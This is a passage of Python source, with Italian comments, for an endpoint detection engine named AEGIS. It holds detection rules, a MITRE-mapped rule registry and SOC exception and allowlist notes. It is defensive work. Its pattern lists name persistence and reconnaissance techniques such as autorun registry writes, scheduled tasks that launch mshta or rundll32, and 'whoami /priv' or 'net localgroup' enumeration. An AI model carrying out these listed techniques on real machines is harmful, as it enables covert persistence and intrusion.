    # Il path deve essere NOTO: `_in_standard_path("")` e' False, quindi con
    # path vuoto il ramo fuzzy concludeva "fuori dai path di sistema" e
    # segnalava il svchost.exe LEGITTIMO di Windows. Non e' teorico: il
    # sensore non riesce a leggere il path dei processi di sistema (svchost
    # gira come SYSTEM in un'altra sessione) e l'alert scattava ogni ora su
    # ogni macchina Windows, una volta scaduta la soppressione. Il ramo fuzzy
    # e' un'euristica su un'euristica: senza il dato del path non si accende.
    stem = _stem(name)
    if event.process_path and not _in_standard_path(event.process_path):
        for bad in {_stem(b) for b in persistence_names} | {"svchost", "scvhosts"}:
            if _lev(stem, bad) <= 1:
                return RuleResult(
                    triggered=True, severity="HIGH",
                    description=f"Suspicious persistence-like process name (variant of '{bad}'): '{event.process_name}'.",
                    mitre_tactic_id="TA0003", mitre_tactic="Persistence", mitre_technique="Boot or Logon Autostart Execution",
                    mitre_technique_id="T1547"
                )
    return RuleResult(triggered=False)


# ── Persistenza e discovery viste dalla COMMAND LINE ────────────────────
# Perché servivano: la persistenza era coperta solo dallo snapshot read-only
# all'avvio (evidenza, non alert) e dal match sul NOME del processo. Un Run key
# scritto a runtime, o una scheduled task creata, non generavano nulla — e sono
# i due modi piu' comuni di restare sulla macchina. L'azione sta negli
# argomenti, non nel nome del binario: `reg.exe` e `schtasks.exe` sono binari di
# sistema legittimi.

_RUN_KEY_PATHS = (
    "\\currentversion\\run",
    "\\currentversion\\runonce",
    "\\currentversion\\policies\\explorer\\run",
)
# Solo verbi che SCRIVONO: `reg query` (lettura) non deve scattare.
_REG_WRITE_MARKERS = (
    " add ", "set-itemproperty", "new-itemproperty", "reg import", "reg copy",
)
_TASK_WRITE_MARKERS = ("/create", "-create", "/change")
# Azione della task che esegue codice invece di un programma: peggio.
_TASK_SCRIPT_ACTIONS = (
    "powershell", "pwsh", "cmd.exe", "cmd /c", "wscript", "cscript",
    "mshta", "rundll32", "regsvr32", ".ps1", ".vbs", ".js",
)
# (sottostringa normalizzata, id tecnica, nome tecnica). Gli id sono espliciti
# e non derivati dal nome: "Account Discovery" e' T1087, non T1069.
_DISCOVERY_COMMANDS = (
    ("whoami /all", "T1033", "System Owner/User Discovery"),
    ("whoami /priv", "T1069", "Permission Groups Discovery"),
    ("whoami /groups", "T1069", "Permission Groups Discovery"),
    ("net user", "T1087", "Account Discovery"),
    ("net group", "T1069", "Permission Groups Discovery"),
    ("net localgroup", "T1069", "Permission Groups Discovery"),
    ("net accounts", "T1087", "Account Discovery"),
    ("quser", "T1033", "System Owner/User Discovery"),
    ("query user", "T1033", "System Owner/User Discovery"),
)


def rule_autorun_registry_write(event: EventSchema) -> RuleResult:
    """Scrittura di una chiave Run/RunOnce (persistenza a ogni logon).

    La lettura (`reg query`) e gli altri usi del registro non scattano: serve
    insieme la chiave di autorun E un verbo di scrittura. Gli installer
    legittimi che scrivono un Run key sono elencati tra le eccezioni della
    regola, perche' e' l'unico caso in cui questa detection fa rumore.
    """
    cmd = (event.command_line or "").lower()
    if not cmd:
        return RuleResult(triggered=False)
    if not any(k in cmd for k in _RUN_KEY_PATHS):
        return RuleResult(triggered=False)
    if not any(w in cmd for w in _REG_WRITE_MARKERS):
        return RuleResult(triggered=False)
    return RuleResult(
        triggered=True, severity="HIGH",
        description=(f"Autorun registry key written by '{event.process_name}': "
                     f"'{event.command_line[:200]}'."),
        mitre_tactic_id="TA0003", mitre_tactic="Persistence",
        mitre_technique="Registry Run Keys / Startup Folder",
        mitre_technique_id="T1547.001",
    )


def rule_scheduled_task_creation(event: EventSchema) -> RuleResult:
    """Creazione di una scheduled task: persistenza che non richiede riavvii.

    `schtasks /query` (lettura) non scatta. Se l'azione lancia un interprete di
    script o un LOLBin invece di un programma, la severity sale: una task che
    esegue PowerShell e' il modo piu' diretto per sopravvivere alla chiusura
    della sessione.
    """
    cmd = (event.command_line or "").lower()
    if not cmd or not any(m in cmd for m in _TASK_WRITE_MARKERS):
        return RuleResult(triggered=False)
    script_action = any(a in cmd for a in _TASK_SCRIPT_ACTIONS)
    return RuleResult(
        triggered=True,
        severity="CRITICAL" if script_action else "HIGH",
        description=(f"Scheduled task created by '{event.process_name}'"
                     f"{' running a script interpreter' if script_action else ''}: "
                     f"'{event.command_line[:200]}'."),
        mitre_tactic_id="TA0003", mitre_tactic="Persistence",
        mitre_technique="Scheduled Task/Job",
        mitre_technique_id="T1053.005",
    )


def rule_discovery_commands(event: EventSchema) -> RuleResult:
    """Recon locale: enumerazione di utenti, gruppi e privilegi.

    Da sola e' una ricognizione (MEDIUM): nel contesto di una catena di attacco
    e' il passo che precede l'escalation. Un `whoami` nudo non scatta — lo
    usano ovunque build e installer — servono le forme di enumerazione
    (`/all`, `/priv`, `net user` senza argomenti).
    """
    # Normalizzazione: gli argomenti arrivano con l'estensione (`whoami.exe
    # /all`), quindi senza toglierla nessun confronto scritto in modo naturale
    # (`whoami /all`) matchava mai. Il collasso degli spazi copre gli attacchi
    # di spaziatura banali (`whoami    /all`).
    cmd = " ".join((event.command_line or "").lower().split())
    cmd = re.sub(r"\.exe\b", "", cmd)
    if not cmd:
        return RuleResult(triggered=False)
    name = (event.process_name or "").lower()
    if name not in ("whoami.exe", "whoami", "net.exe", "net1.exe", "net",
                    "quser.exe", "query.exe", "query"):
        return RuleResult(triggered=False)
    for needle, technique_id, technique in _DISCOVERY_COMMANDS:
        if needle in cmd:
            return RuleResult(
                triggered=True, severity="MEDIUM",
                description=(f"Reconnaissance command '{needle}' executed by "
                             f"'{event.process_name}': '{event.command_line[:200]}'."),
                mitre_tactic_id="TA0007", mitre_tactic="Discovery",
                mitre_technique=technique,
                mitre_technique_id=technique_id,
            )
    return RuleResult(triggered=False)


# ═══════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════

_PRIVATE_V4 = re.compile(r'^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.|0\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.)')
_PRIVATE_V6 = re.compile(r'^(::1$|::ffff:|fe80:|fc00:|fd[0-9a-f]{2}:|fec0:)', re.IGNORECASE)


def _is_private_ip(ip: str) -> bool:
    """IPv4 (incl. CGNAT 100.64/10) + IPv6 (loopback, link-local, ULA).
    Unica implementazione condivisa (audit: ce n'erano due divergenti)."""
    s = (ip or "").strip().strip("[]").split("%")[0]
    if not s:
        return True
    if ":" in s:
        return bool(_PRIVATE_V6.match(s))
    return bool(_PRIVATE_V4.match(s))

# ═══════════════════════════════════════════════════════════════════
#  STATIC RULES REGISTRY
# ═══════════════════════════════════════════════════════════════════

STATIC_RULES = [
    StaticRule(rule_id="AEGIS-S001", version="1.0", confidence="high",
               name="Known Attack Tool", severity="CRITICAL",
               description="Detects 200+ known attack tools, credential dumpers, scanners, RATs, ransomware, etc.",
               mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="User Execution",
               mitre_technique_id="T1204", fn=rule_known_attack_tool),
    StaticRule(rule_id="AEGIS-S002", version="1.0", confidence="high",
               name="Suspicious Parent-Child", severity="CRITICAL",
               description="Anomalous process lineage: Office, browser, PDF reader spawning script interpreters.",
               mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="User Execution",
               mitre_technique_id="T1204", fn=rule_suspicious_parent_child),
    StaticRule(rule_id="AEGIS-S003", version="1.0", confidence="high",
               name="Malware Family", severity="HIGH",
               description="Process names matching known malware family patterns (trojan, backdoor, miner, ransomware, etc.). MITRE varies per matched family at runtime (see alert fields).",
               mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="Varies by family",
               mitre_technique_id="T1204", fn=rule_malware_family),
    StaticRule(rule_id="AEGIS-S004", version="1.0", confidence="medium",
               name="Suspicious Execution Path", severity="HIGH",
               description="Processes executing from temp, downloads, cache, public, or other suspicious paths.",
               mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="Command and Scripting Interpreter",
               mitre_technique_id="T1059", fn=rule_suspicious_execution_path),
    StaticRule(rule_id="AEGIS-S005", version="1.0", confidence="medium",
               name="Privilege Escalation", severity="HIGH",
               description="Desktop/user apps running with SYSTEM/root privileges.",
               mitre_tactic_id="TA0004", mitre_tactic="Privilege Escalation", mitre_technique="Access Token Manipulation",
               mitre_technique_id="T1134", fn=rule_privilege_escalation),
    StaticRule(rule_id="AEGIS-S006", version="1.0", confidence="high",
               name="Double Extension", severity="HIGH",
               description="Files with double extensions indicating masquerading attacks.",
               mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Masquerading",
               mitre_technique_id="T1036", fn=rule_double_extension),
    StaticRule(rule_id="AEGIS-S007", version="1.0", confidence="high",
               name="Encoded Command", severity="HIGH",
               description="Base64 encoded or obfuscated commands indicating payload delivery.",
               mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Obfuscated Files or Information",
               mitre_technique_id="T1027", fn=rule_encoded_command),
    StaticRule(rule_id="AEGIS-S008", version="1.0", confidence="medium",
               name="Persistence Path", severity="HIGH",
               description="Process executing from persistence locations (startup, cron, systemd, launchd).",
               mitre_tactic_id="TA0003", mitre_tactic="Persistence", mitre_technique="Boot or Logon Autostart Execution",
               mitre_technique_id="T1547", fn=rule_persistence_path),
    StaticRule(rule_id="AEGIS-S009", version="1.0", confidence="low",
               name="Script Interpreter Abuse", severity="MEDIUM",
               description="Script interpreters like PowerShell, cmd, bash, Python, Perl, etc. detected.",
               mitre_tactic_id="TA0002", mitre_tactic="Execution", mitre_technique="Command and Scripting Interpreter",
               mitre_technique_id="T1059", fn=rule_script_interpreter_abuse),
    StaticRule(rule_id="AEGIS-S010", version="1.0", confidence="low",
               name="Network Tool in Suspicious Path", severity="MEDIUM",
               description="Network reconnaissance tools executed from suspicious directories.",
               mitre_tactic_id="TA0007", mitre_tactic="Discovery", mitre_technique="System Network Configuration Discovery",
               mitre_technique_id="T1016", fn=rule_network_tool),
    StaticRule(rule_id="AEGIS-S011", version="1.0", confidence="medium",
               name="DLL Hijacking", severity="HIGH",
               description="DLL loaded from suspicious/user-writable path indicating possible DLL hijacking.",
               mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="DLL Side-Loading",
               mitre_technique_id="T1574", fn=rule_dll_hijack_path),
    StaticRule(rule_id="AEGIS-S012", version="1.0", confidence="medium",
               name="LOLBin Abuse", severity="HIGH",
               description="Living-off-the-land binary executed from non-standard path.",
               mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Signed Binary Proxy Execution",
               mitre_technique_id="T1218", fn=rule_lolbin_usage),
    StaticRule(rule_id="AEGIS-S013", version="1.0", confidence="low",
               name="High Thread Count", severity="MEDIUM",
               description="Process with abnormally high thread count indicating possible injection.",
               mitre_tactic_id="TA0005", mitre_tactic="Defense Evasion", mitre_technique="Process Injection",
               mitre_technique_id="T1055", fn=rule_high_thread_count),
    StaticRule(rule_id="AEGIS-S014", version="1.0", confidence="low",
               name="Network Beacon", severity="MEDIUM",
               description="Process with outbound connections to public IPs — possible C2 beacon.",
               mitre_tactic_id="TA0011", mitre_tactic="Command and Control", mitre_technique="Application Layer Protocol",
               mitre_technique_id="T1071", fn=rule_network_beacon),
    StaticRule(rule_id="AEGIS-S015", version="1.0", confidence="medium",
               name="Persistence Autorun", severity="HIGH",
               description="Process name mimics common persistence or masquerades as legitimate software.",
               mitre_tactic_id="TA0003", mitre_tactic="Persistence", mitre_technique="Boot or Logon Autostart Execution",
               mitre_technique_id="T1547", fn=rule_persistence_autorun),
    StaticRule(rule_id="AEGIS-S016", version="1.0", confidence="high",
               name="Autorun Registry Write", severity="HIGH",
               description="Run/RunOnce registry key written (runtime persistence, invisible to the startup snapshot).",
               mitre_tactic_id="TA0003", mitre_tactic="Persistence", mitre_technique="Registry Run Keys / Startup Folder",
               mitre_technique_id="T1547.001", fn=rule_autorun_registry_write),
    StaticRule(rule_id="AEGIS-S017", version="1.0", confidence="high",
               name="Scheduled Task Creation", severity="HIGH",
               description="Scheduled task created; CRITICAL when the action runs a script interpreter or LOLBin.",
               mitre_tactic_id="TA0003", mitre_tactic="Persistence", mitre_technique="Scheduled Task/Job",
               mitre_technique_id="T1053.005", fn=rule_scheduled_task_creation),
    StaticRule(rule_id="AEGIS-S018", version="1.0", confidence="medium",
               name="Discovery Commands", severity="MEDIUM",
               description="Local account/group/privilege enumeration (whoami /all, net user, net localgroup, quser).",
               mitre_tactic_id="TA0007", mitre_tactic="Discovery", mitre_technique="System Owner/User Discovery",
               mitre_technique_id="T1033", fn=rule_discovery_commands),
]

ALL_RULES = [s.fn for s in STATIC_RULES]

RULE_BY_FN = {s.fn: s for s in STATIC_RULES}


def stamp_result(rule_fn, result: "RuleResult") -> "RuleResult":
    """Timbro identità/versione/confidenza dal registry (default: custom)."""
    meta = RULE_BY_FN.get(rule_fn)
    if meta is not None and (not result.rule_id or result.rule_id == "custom"):
        result.rule_id = meta.rule_id
        result.version = meta.version
        result.confidence = meta.confidence
    return result


def canary_rule_ids() -> set:
    """ID regole in canary (log-only, niente alert) da env RULE_CANARY_IDS."""
    try:
        from app.core.config import settings
        raw = getattr(settings, "RULE_CANARY_IDS", "") or ""
    except Exception:
        raw = ""
    return {r.strip().upper() for r in raw.split(",") if r.strip()}


def is_canary_rule(rule_id: str) -> bool:
    return bool(rule_id) and rule_id.strip().upper() in canary_rule_ids()


# Fase 5 — spiegaabilità SOC: per ogni regola, eccezioni note e allowlist
# (casi "tranquilli" che NON devono generare alert). Serve al motore come
# supporto doc e alla UI per mostrare il razionale della detection.
RULE_NOTES: dict[str, dict] = {
    "AEGIS-S001": {
        "exceptions": ("Authorized administration/simulation tooling",
                       "Analysis sandboxes and labs (explicit allowlist)"),
        "allowlist": ("SOC-approved IT/pentest tooling",
                      "Legitimate renamed/repackaged binaries with a valid signature and known build script"),
    },
    "AEGIS-S002": {
        "exceptions": ("CI machines that run builds/packaging through an interpreter",
                       "Already-approved Office macro automation"),
        "allowlist": ("Interpreters launched by signed wrappers with a known relationship",
                      "Red-team simulations covered by a canary rule"),
    },
    "AEGIS-S003": {
        "exceptions": ("File names with 'trojan'/'miner' that are NOT executable (logs, text)",
                       "Projects whose names contain the pattern (e.g. 'ProjectRansom')"),
        "allowlist": ("Signed Microsoft binaries that contain 'password' in the name",
                      "IT tools with overlapping names (e.g. license managers' 'loader')"),
    },
    "AEGIS-S004": {
        "exceptions": ("Installers using %TEMP% as scratch space before copying into Program Files",
                       "Browsers running update helpers from their cache"),
        "allowlist": ("Approved working paths per department (documented per site)",
                      "Known CI/CD staging directories"),
    },
    "AEGIS-S005": {
        "exceptions": ("Desktop apps launched via RunAs from remote administration",
                       "Kiosks and VDIs with an execution policy"),
        "allowlist": ("Local 'operator' user profile with documented delegation",
                      "Hosts with an approved legacy 'users-as-admin' configuration"),
    },
    "AEGIS-S006": {
        "exceptions": ("Real double-extension files handled by the document management team"),
        "allowlist": ("Double-extension file types validated by DLP and signed"),
    },
    "AEGIS-S007": {
        "exceptions": ("Administrative encoded scripts already reviewed and approved",
                       "Enterprise policy passing encoded parameters from official tooling"),
        "allowlist": ("Known hashes of signed encoded scripts versioned by the SOC"),
    },
    "AEGIS-S008": {
        "exceptions": ("Enterprise software with Startup auto-update (Adobe, Java, Chrome)",
                       "Scheduled tasks created by managed software"),
        "allowlist": ("Persistence paths of approved software (software inventory)"),
    },
    "AEGIS-S009": {
        "exceptions": ("Administrators who routinely use PowerShell/scripting tools"),
        "allowlist": ("Interpreters used by known patch manager/management processes"),
    },
    "AEGIS-S010": {
        "exceptions": ("Network tooling used by the networking/sysadmin team under a change ticket"),
        "allowlist": ("Approved monitoring suites (planned nmap) from known source IPs"),
    },
    "AEGIS-S011": {
        "exceptions": ("Vendor side-by-side DLLs in AppData that are documented",
                       "Plug-ins legitimately loaded from user folders"),
        "allowlist": ("DLLs/hashes with a valid signature from approved vendors"),
    },
    "AEGIS-S012": {
        "exceptions": ("LOLBins used by documented IT automation (certutil to verify, bitsadmin to patch)"),
        "allowlist": ("Standard system32/syswow64/usr/bin paths (excluded) already handled",
                      "Signed enterprise scripts invoking LOLBins from approved paths"),
    },
    "AEGIS-S013": {
        "exceptions": ("Legitimate multithreaded processes (antivirus, databases, browsers)"),
        "allowlist": ("Processes whose historical average thread count exceeds the threshold (local baseline)"),
    },
    "AEGIS-S014": {
        "exceptions": ("Software updates/telemetry toward known public IPs",
                       "Browsers with routine HTTPS connections"),
        "allowlist": ("Domains/IPs for approved software updates (from inventory)"),
    },
    "AEGIS-S016": {
        "exceptions": ("Signed installers and updaters that legitimately register an autostart entry",
                       "Corporate software deployment that pins a Run key as part of the package"),
        "allowlist": ("Change-management record for the Run key (owner, software, date)",
                      "Publisher/signature of the writing process, when the sensor can resolve it"),
    },
    "AEGIS-S017": {
        "exceptions": ("Task Scheduler actions configured by IT maintenance windows",
                       "Backup/patch jobs created by signed management agents"),
        "allowlist": ("Task names under the company's naming convention",
                      "Signed management agent as the task creator"),
    },
    "AEGIS-S018": {
        "exceptions": ("Help desk and support scripts that enumerate local users as part of triage",
                       "Login scripts and monitoring agents"),
        "allowlist": ("Approved administrative scripts versioned by the SOC",
                      "Interactive operator sessions covered by a canary rule"),
    },
    "AEGIS-S015": {
        "exceptions": ("Vendors using similar names (e.g. legitimate 'GoogleUpdate')"),
        "allowlist": ("Process names of software installed through the software inventory"),
    },
    "custom": {
        "exceptions": ("No standard exceptions for custom rules"),
        "allowlist": ("No standard allowlist for custom rules"),
    },
}


def rule_exceptions(rule_id: str) -> tuple:
    """Eccezioni documentate della regola (stringhe leggibili per il SOC)."""
    notes = RULE_NOTES.get(rule_id or "custom", RULE_NOTES["custom"])
    return tuple(notes.get("exceptions", ()))


def rule_allowlist(rule_id: str) -> tuple:
    """Allowlist documentata della regola (stringhe leggibili per il SOC)."""
    notes = RULE_NOTES.get(rule_id or "custom", RULE_NOTES["custom"])
    return tuple(notes.get("allowlist", ()))


def rule_catalog() -> list[dict]:
    """Catalogo regole per la UI/differenzazione: ID, versione, confidenza,
    MITRE, eccezioni e allowlist. Nessuna logica di esecuzione qui."""
    out = []
    for s in STATIC_RULES:
        notes = RULE_NOTES.get(s.rule_id, {})
        out.append({
            "rule_id": s.rule_id,
            "name": s.name,
            "version": s.version,
            "confidence": s.confidence,
            "severity": s.severity,
            "mitre_tactic_id": s.mitre_tactic_id,
            "mitre_tactic": s.mitre_tactic,
            "mitre_technique_id": s.mitre_technique_id,
            "mitre_technique": s.mitre_technique,
            "description": s.description,
            "exceptions": list(notes.get("exceptions", [])),
            "allowlist": list(notes.get("allowlist", [])),
        })
    return out
